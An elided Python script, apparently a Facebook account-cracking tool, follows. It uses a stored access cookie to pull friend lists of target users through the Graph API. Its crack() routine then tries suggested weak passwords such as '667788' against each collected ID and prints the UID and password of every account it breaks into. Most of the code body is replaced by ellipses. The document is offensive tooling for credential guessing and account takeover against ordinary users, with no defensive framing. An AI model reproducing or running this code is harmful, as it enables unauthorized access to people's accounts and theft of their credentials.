...
def main():
    ...
    if option =='1':
        ...
        os.system('rm -rf access_cookie.txt')
...
def manual():
    ...
    try:
        ...
        cookie = open('access_cookie.txt', 'r').read()
    ...
    try:
        ...
        r = requests.get('https://graph.facebook.com/me?access_cookie='+cookie).text
    ...
    for u in range(limit):
        ...
        try:
            ...
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?access_cookie='+cookie).text
...
def auto():
    ...
    try:
        ...
        access_cookie = open('access_cookie.txt', 'r').read()
    ...
    try:
        ...
        r = requests.get('https://graph.facebook.com/me?access_cookie='+access_cookie).text
    ...
    for fir in range(limit_user):
        ...
        try:
            ...
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?access_cookie='+access_cookie).text
    ...
    for ids in fileidopen:
        ...
        try:
            ...
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?access_cookie='+access_cookie).text
...
def crack():
    ...
    if gaddari =='1':
        ...
        print('  Password example: 667788,334455,99900,love you,kankan etc')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in get_cookie:
                ...
                print('\033[1;32m  [Successful-SILENT] '+uid+' | '+ps+'\033[0;97m')
                ...
                print('\033[1;31m  [Checkpoint-SILENT] '+uid+' | '+ps+'\033[0;97m')
...
def login():
    ...
    tok = input('  Put access cookie: ')

    try:

        u = requests.get('https://graph.facebook.com/me?access_cookie='+cok).text
